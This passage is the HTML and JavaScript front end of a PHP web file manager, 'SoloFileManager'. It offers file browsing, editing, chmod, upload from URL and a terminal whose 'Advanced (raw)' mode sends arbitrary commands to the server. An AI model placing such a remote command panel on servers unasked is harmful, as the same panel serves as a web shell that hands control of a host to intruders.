th,td{padding:8px;text-align:left;border-bottom:1px solid #222}
th{color:#888;font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:.05em}
tr:hover{background:#1a1a1a}
td.name{font-family:monospace;cursor:pointer;color:#0af}
td.name:hover{text-decoration:underline}
td.actions{text-align:right;white-space:nowrap}
td.actions button{background:transparent;color:#888;border:1px solid #333;padding:2px 8px;border-radius:3px;cursor:pointer;font-size:11px;margin-left:4px}
td.actions button:hover{color:#fff;border-color:#666}
.icon-folder::before{content:'📁 '}
.icon-file::before{content:'📄 '}
.toast{position:fixed;bottom:20px;right:20px;background:#0a84ff;color:#fff;padding:12px 20px;border-radius:6px;box-shadow:0 4px 16px rgba(0,0,0,.5);z-index:10000;animation:slideIn .3s;max-width:400px}
.toast.error{background:#ff3b30}
@keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:9000}
.modal.open{display:flex;align-items:center;justify-content:center}
.modal .box{background:#1e1e1e;padding:20px;border-radius:8px;width:min(900px,95vw);max-height:90vh;display:flex;flex-direction:column}
.modal .box.wide{width:min(1200px,96vw)}
.modal h2{margin:0 0 12px;font-size:16px;color:#0af}
.modal input,.modal textarea,.modal select{background:#000;color:#0f0;border:1px solid #333;padding:8px;border-radius:4px;font-family:monospace;font-size:13px;width:100%}
.modal input:focus,.modal textarea:focus,.modal select:focus{outline:none;border-color:#0a84ff}
.modal textarea{resize:none}
.modal .row{display:flex;gap:8px;margin-bottom:12px}
.modal .row button{background:#0a84ff;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer}
.modal .row button.ghost{background:#333}
.modal .row button:hover{opacity:.85}
pre.term{background:#000;color:#0f0;padding:12px;border-radius:4px;overflow:auto;flex:1;margin:8px 0;font-size:12px;font-family:monospace;white-space:pre-wrap;min-height:200px}
.empty{text-align:center;padding:40px;color:#555}
</style></head><body>

<header>
    <h1>📂 SoloFileManager</h1>
    <div class="path-bar">
        <input id="current-path" value="/" onkeydown="if(event.key==='Enter')fmGotoInput()">
        <button class="ghost" onclick="fmGotoInput()">Go</button>
    </div>
    <button onclick="fmReload()">🔄 Refresh</button>
    <button class="ghost" onclick="fmOpenUploadUrl()">🌐 From URL</button>
    <button class="ghost" onclick="fmOpenUploadFile()">⬆️ Upload</button>
    <button class="ghost" onclick="fmOpenMkdir()">📁 New Folder</button>
    <button class="ghost" onclick="fmOpenTerminal()">💻 Terminal</button>
    <button class="ghost" onclick="fmOpenInfo()">ℹ️ Info</button>
    <button class="logout" onclick="fmLogout()">Logout</button>
</header>

<main>
    <table>
        <thead><tr>
            <th style="width:40%">Name</th><th style="width:10%">Size</th>
            <th style="width:15%">Modified</th><th style="width:10%">Perms</th>
            <th style="width:25%;text-align:right">Actions</th>
        </tr></thead>
        <tbody id="list-body"><tr><td colspan="5" class="empty">Loading…</td></tr></tbody>
    </table>
</main>

<div class="modal" id="m-mkdir"><div class="box"><h2>New Folder</h2>
    <input id="mkdir-name" placeholder="folder name" autofocus>
    <div class="row" style="margin-top:12px;justify-content:flex-end">
        <button class="ghost" onclick="fmClose('m-mkdir')">Cancel</button>
        <button onclick="fmDoMkdir()">Create</button></div></div></div>

<div class="modal" id="m-upload"><div class="box"><h2>Upload Files</h2>
    <input type="file" id="upload-files" multiple>
    <div class="row" style="margin-top:12px;justify-content:flex-end">
        <button class="ghost" onclick="fmClose('m-upload')">Cancel</button>
        <button onclick="fmDoUpload()">Upload</button></div></div></div>

<div class="modal" id="m-url"><div class="box"><h2>Upload from URL</h2>
    <input id="url-input" placeholder="https://example.com/file.zip" autofocus>
    <div class="row" style="margin-top:12px;justify-content:flex-end">
        <button class="ghost" onclick="fmClose('m-url')">Cancel</button>
        <button onclick="fmDoUploadUrl()">Download</button></div></div></div>

<div class="modal" id="m-term"><div class="box wide"><h2>💻 Terminal</h2>
    <div class="row">
        <select id="term-mode" onchange="fmTermModeChange()" style="width:200px">
            <option value="preset">Preset</option>
            <option value="manual">Manual (git/php/whoami)</option>
            <option value="advanced">Advanced (raw)</option>
        </select>
        <select id="term-preset" style="width:220px">
            <option value="pwd">Print working dir</option>
            <option value="list">List files</option>
            <option value="phpv">PHP version</option>
            <option value="git">Git status</option>
        </select>
        <input id="term-input" placeholder="command or args…" style="flex:1;display:none">
        <button onclick="fmTermRun()">▶ Run</button>
        <button class="ghost" onclick="fmClose('m-term')">×</button>
    </div>
    <pre class="term" id="term-out">Ready.</pre>
</div></div>

<div class="modal" id="m-info"><div class="box"><h2>ℹ️ Server Info</h2>
    <pre class="term" id="info-out" style="color:#0af">Loading…</pre>
    <div class="row" style="justify-content:flex-end"><button onclick="fmClose('m-info')">Close</button></div>
</div></div>

<div class="modal" id="m-edit"><div class="box wide"><h2>✏️ Edit File</h2>
    <div style="font-family:monospace;font-size:12px;color:#888;margin-bottom:8px" id="edit-title">—</div>
    <textarea id="edit-area" style="height:60vh;font-family:monospace;font-size:13px;white-space:pre;overflow:auto"></textarea>
    <div class="row" style="margin-top:12px;justify-content:flex-end">
        <button class="ghost" onclick="fmClose('m-edit')">Cancel</button>
        <button onclick="fmDoSave()">💾 Save</button></div>
</div></div>

<script>
const FM_URL = <?= json_encode($_SERVER['PHP_SELF'] ?? '') ?>;
let FM_DIR = <?= json_encode($START_DIR) ?>;

function fmToast(msg, type) {
    const t = document.createElement('div');
    t.className = 'toast' + (type==='error'?' error':'');
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(()=>t.remove(), 3500);
}
function fmClose(id) { document.getElementById(id).classList.remove('open'); }
function fmOpen(id) { document.getElementById(id).classList.add('open'); }
function esc(s) { return String(s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
function fmtSize(n) {
    if (n >= 1073741824) return (n/1073741824).toFixed(2)+' GB';
    if (n >= 1048576) return (n/1048576).toFixed(1)+' MB';
    if (n >= 1024) return (n/1024).toFixed(1)+' KB';
    return n+' B';
}
function fmtTime(t) { if (!t) return '—'; return new Date(t*1000).toLocaleString(); }

async function fmApi(action, params, isGet) {
    const url = new URL(FM_URL, location.href);
    const opt = { method: isGet ? 'GET' : 'POST', credentials: 'same-origin' };
    if (isGet) {
        url.searchParams.set('action', action);
        for (const k in (params||{})) url.searchParams.set(k, params[k]);
    } else {
        const fd = new FormData();
        fd.append('action', action);
        for (const k in (params||{})) fd.append(k, params[k]);
        opt.body = fd;
    }
    const r = await fetch(url.toString(), opt);
    const j = await r.json();
    if (j && j.need_login) {
        location.reload();
        return j;
    }
    return j;
}

async function fmLogout() {
    if (!confirm('Logout?')) return;
    try {
        await fmApi('logout', {ajax: '1'});
    } catch (e) {}
    location.reload();
}

async function fmReload() {
    try {
        const j = await fmApi('list', {dir: FM_DIR}, true);
        if (j.status !== 'success') { fmToast(j.msg||'Load failed','error'); return; }
        FM_DIR = j.dir;
        document.getElementById('current-path').value = j.dir;
        const body = document.getElementById('list-body');
        let html = '';
        if (j.parent) {
            html += `<tr><td class="name icon-folder" onclick="fmGoto('${esc(j.parent)}')">..</td><td></td><td></td><td></td><td></td></tr>`;
        }
        const folders = Object.keys(j.folders).sort((a,b)=>a.localeCompare(b,undefined,{numeric:true}));
        const files   = Object.keys(j.files).sort((a,b)=>a.localeCompare(b,undefined,{numeric:true}));
        for (const f of folders) {
            const m = j.folders[f];
            const full = (j.dir.endsWith('/')?j.dir:j.dir+'/') + f;
            html += `<tr>
                <td class="name icon-folder" onclick="fmGoto('${esc(full)}')">${esc(f)}</td>
                <td>—</td><td>${fmtTime(m.mtime)}</td><td><code>${esc(m.permissions)}</code></td>
                <td class="actions">
                    <button onclick="fmRename('${esc(full)}')">✏️ Rename</button>
                    <button onclick="fmChmod('${esc(full)}')">🔑</button>
                    <button onclick="fmDelete('${esc(full)}')">🗑️</button>
                </td></tr>`;
        }
        for (const f of files) {
            const m = j.files[f];
            const full = (j.dir.endsWith('/')?j.dir:j.dir+'/') + f;
            html += `<tr>
                <td class="name icon-file" onclick="fmDownload('${esc(full)}')">${esc(f)}</td>
                <td>${fmtSize(m.size)}</td><td>${fmtTime(m.mtime)}</td><td><code>${esc(m.permissions)}</code></td>
                <td class="actions">
                    <button onclick="fmEditOpen('${esc(full)}')">✏️ Edit</button>
                    <button onclick="fmDownload('${esc(full)}')">⬇️</button>
                    <button onclick="fmRename('${esc(full)}')">✏️</button>
                    <button onclick="fmDelete('${esc(full)}')">🗑️</button>
                </td></tr>`;
        }
        if (!html) html = '<tr><td colspan="5" class="empty">Empty folder</td></tr>';
        body.innerHTML = html;
    } catch (e) { fmToast('Error: '+e.message,'error'); }
}

function fmGoto(p) { FM_DIR = p; fmReload(); }
function fmGotoInput() {
    const p = document.getElementById('current-path').value.trim();
    if (p) fmGoto(p);
}
function fmDownload(p) { location.href = FM_URL+'?action=download&path='+encodeURIComponent(p); }

function fmOpenMkdir() { document.getElementById('mkdir-name').value=''; fmOpen('m-mkdir'); setTimeout(()=>document.getElementById('mkdir-name').focus(),100); }
async function fmDoMkdir() {
    const name = document.getElementById('mkdir-name').value.trim();
    if (!name) return;
    const j = await fmApi('mkdir', {dir: FM_DIR, name});
    if (j.status==='success') { fmClose('m-mkdir'); fmReload(); }
    else fmToast(j.msg,'error');
}

function fmOpenUploadFile() { document.getElementById('upload-files').value=''; fmOpen('m-upload'); }
async function fmDoUpload() {
    const inp = document.getElementById('upload-files');
    if (!inp.files.length) return;
    const fd = new FormData();
    fd.append('action','upload');
    fd.append('dir', FM_DIR);
    for (const f of inp.files) fd.append('files[]', f);
    const r = await fetch(FM_URL, {method:'POST', body:fd, credentials:'same-origin'});
    const j = await r.json();
    if (j.status==='success') { fmClose('m-upload'); fmReload(); fmToast('Uploaded: '+j.saved.length); }
    else fmToast(j.msg||'Upload failed','error');
}

function fmOpenUploadUrl() { document.getElementById('url-input').value=''; fmOpen('m-url'); setTimeout(()=>document.getElementById('url-input').focus(),100); }
async function fmDoUploadUrl() {
    const url = document.getElementById('url-input').value.trim();
    if (!url) return;
    fmToast('Downloading…');
    const j = await fmApi('upload_from_url', {url, dir: FM_DIR});
    if (j.status==='success') { fmClose('m-url'); fmReload(); fmToast('Downloaded: '+j.name+' ('+fmtSize(j.size)+')'); }
    else fmToast(j.msg,'error');
}

async function fmDelete(p) {
    if (!confirm('Move to trash?\n\n'+p)) return;
    const j = await fmApi('delete', {path: p});
    if (j.status==='success') fmReload(); else fmToast(j.msg,'error');
}
async function fmRename(p) {
    const n = prompt('New name:', p.split(/[\\/]/).pop());
    if (!n) return;
    const j = await fmApi('rename', {path: p, name: n});
    if (j.status==='success') fmReload(); else fmToast(j.msg,'error');
}
async function fmChmod(p) {
    const m = prompt('Permissions (e.g. 0644):', '0644');
    if (!m) return;
    const j = await fmApi('chmod', {path: p, mode: m});
    if (j.status==='success') fmReload(); else fmToast(j.msg,'error');
}

function fmOpenTerminal() { fmOpen('m-term'); }
function fmTermModeChange() {
    const m = document.getElementById('term-mode').value;
    document.getElementById('term-preset').style.display = m==='preset' ? '' : 'none';
    document.getElementById('term-input').style.display  = m==='preset' ? 'none' : '';
    document.getElementById('term-input').focus();
}
async function fmTermRun() {
    const mode = document.getElementById('term-mode').value;
    const cmd = document.getElementById('term-preset').value;
    const input = document.getElementById('term-input').value;
    const out = document.getElementById('term-out');
    out.textContent += '\n$ ' + (mode==='preset'?cmd:input) + '\n…';
    const j = await fmApi('terminal_run', {dir: FM_DIR, mode, cmd, input});
    out.textContent = out.textContent.replace(/\n…$/, '');
    if (j.status === 'success') {
        out.textContent += '\n' + (j.output || '(no output)') + '\n[exit '+j.exit_code+']';
    } else {
        out.textContent += '\n[ERROR] ' + j.msg;
    }
    out.scrollTop = out.scrollHeight;
}

async function fmOpenInfo() {
    fmOpen('m-info');
    const j = await fmApi('info', {}, true);
    const el = document.getElementById('info-out');
    if (j.status === 'success') {
        el.textContent = Object.entries(j.info).map(([k,v])=>k.padEnd(20)+': '+(typeof v==='object'?JSON.stringify(v):v)).join('\n');
    } else el.textContent = j.msg;
}

async function fmEditOpen(p) {
    const j = await fmApi('file_read', {path: p});
    if (j.status !== 'success') { fmToast(j.msg,'error'); return; }
    window._fmEditPath = p;
    document.getElementById('edit-title').textContent = j.path + '  (' + fmtSize(j.size) + ')';
    document.getElementById('edit-area').value = j.content;
    fmOpen('m-edit');
}
async function fmDoSave() {
    const content = document.getElementById('edit-area').value;
    const j = await fmApi('file_save', {path: window._fmEditPath, content});
    if (j.status==='success') { fmToast('Saved ('+j.bytes+' bytes)'); fmClose('m-edit'); fmReload(); }
    else fmToast(j.msg,'error');
}

fmReload();
</script>
</body></html>